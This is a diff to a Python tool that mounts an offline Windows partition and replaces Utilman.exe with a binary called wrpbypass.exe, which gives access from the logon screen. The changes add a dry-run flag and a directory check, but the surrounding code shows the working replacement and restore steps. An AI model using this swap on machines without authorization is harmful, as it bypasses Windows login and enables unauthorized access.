@@ -40,8 +40,11 @@ def umount_partition(mountpoint):
     print(f"[+] Unmounted: {mountpoint}")
 
 
-def backup_and_replace_utilman(win_root, wrp_exe_src):
+def backup_and_replace_utilman(win_root, wrp_exe_src, dry_run=False):
     windows_dir = Path(win_root) / "Windows" / "System32"
+    if not windows_dir.is_dir():
+        print(f"[!] {windows_dir} not found. This does not look like a Windows system root.")
+        return
     utilman = windows_dir / "Utilman.exe"
     utilman_backup = windows_dir / "Utilman.exe.tmp"
     wrp_exe_dst = windows_dir / "wrpbypass.exe"
@@ -59,22 +62,27 @@ def backup_and_replace_utilman(win_root, wrp_exe_src):
         print("[!] Backup Utilman.exe.tmp already exists. Skipping backup.")
     else:
         print(f"[+] Renaming {utilman} -> {utilman_backup}")
-        utilman.rename(utilman_backup)
+        if not dry_run:
+            utilman.rename(utilman_backup)
 
     # Copy our wrpbypass.exe
     print(f"[+] Copy {wrp_exe_src} -> {wrp_exe_dst}")
-    run(["cp", str(wrp_exe_src), str(wrp_exe_dst)])
+    if not dry_run:
+        run(["cp", str(wrp_exe_src), str(wrp_exe_dst)])
 
     # Replace Utilman.exe
     print(f"[+] Replacing {utilman} with wrpbypass.exe")
-    if utilman.exists():
-        utilman.unlink()
-    wrp_exe_dst.rename(utilman)
+    if not dry_run:
+        if utilman.exists():
+            utilman.unlink()
+        wrp_exe_dst.rename(utilman)
 
     print("[+] Replacement completed. On the logon screen, press the Ease of Access button to start wrpbypass.")
+    if dry_run:
+        print("[DRY-RUN] No files were actually modified.")
 
 
-def restore_files(win_root):
+def restore_files(win_root, dry_run=False):
     windows_dir = Path(win_root) / "Windows" / "System32"
     utilman = windows_dir / "Utilman.exe"
     utilman_backup = windows_dir / "Utilman.exe.tmp"
@@ -87,17 +95,22 @@ def restore_files(win_root):
     # Remove standalone wrpbypass.exe if present
     if wrp_exe.exists():
         print(f"[+] Removing {wrp_exe}")
-        wrp_exe.unlink()
+        if not dry_run:
+            wrp_exe.unlink()
 
     # Remove current Utilman.exe if it is not the backup
     if utilman.exists() and utilman != utilman_backup:
         print(f"[+] Removing current {utilman}")
-        utilman.unlink()
+        if not dry_run:
+            utilman.unlink()
 
     print(f"[+] Restoring {utilman_backup} -> {utilman}")
-    utilman_backup.rename(utilman)
+    if not dry_run:
+        utilman_backup.rename(utilman)
 
     print("[+] Files successfully restored.")
+    if dry_run:
+        print("[DRY-RUN] No files were actually modified.")
 
 
 def main(): 
@@ -116,6 +129,11 @@ def main():
         "--wrpbypass-exe",
         help="Path to wrpbypass.exe (required in install mode, e.g. /media/usb/dist/wrpbypass.exe)",
     )
+    parser.add_argument(
+        "--dry-run",
+        action="store_true",
+        help="Show what would be done without modifying any files",
+    )
 
     args = parser.parse_args()
     ensure_root()
@@ -128,9 +146,9 @@ def main():
             if not args.wrpbypass_exe:
                 print("[!] In install mode you must pass --wrpbypass-exe /path/to/wrpbypass.exe")
                 sys.exit(1)
-            backup_and_replace_utilman(mountpoint, args.wrpbypass_exe)
+            backup_and_replace_utilman(mountpoint, args.wrpbypass_exe, dry_run=args.dry_run)
         elif args.mode == "restore":
-            restore_files(mountpoint)
+            restore_files(mountpoint, dry_run=args.dry_run)
     finally:
         # Path.is_mount() не существует, используем os.path.ismount
         if mountpoint and os.path.ismount(str(mountpoint)):
